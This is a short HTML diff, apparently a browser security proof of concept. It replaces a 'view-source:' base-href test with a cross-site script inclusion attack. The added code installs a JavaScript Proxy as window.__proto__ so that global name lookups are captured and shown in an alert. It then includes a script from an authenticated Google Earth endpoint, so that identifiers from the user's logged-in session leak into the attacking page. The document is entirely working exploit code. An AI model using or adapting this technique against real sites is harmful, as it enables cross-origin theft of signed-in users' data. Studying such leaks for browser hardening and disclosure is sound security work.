@@ -1,3 +1,9 @@
-<base href="view-source:https://">
+<SCRIPT>
+var handler = {
+ has: function(target, name) {alert("data=" + name); return true},
+ get: function(target, name) {return 1}
+};
+window.__proto__ = new Proxy({}, handler);
+</SCRIPT>
 
-<a href=google.com>evil</a>
+<script src="https://earth.google.com/earth/rpc/cc/u/0/auth"></script>
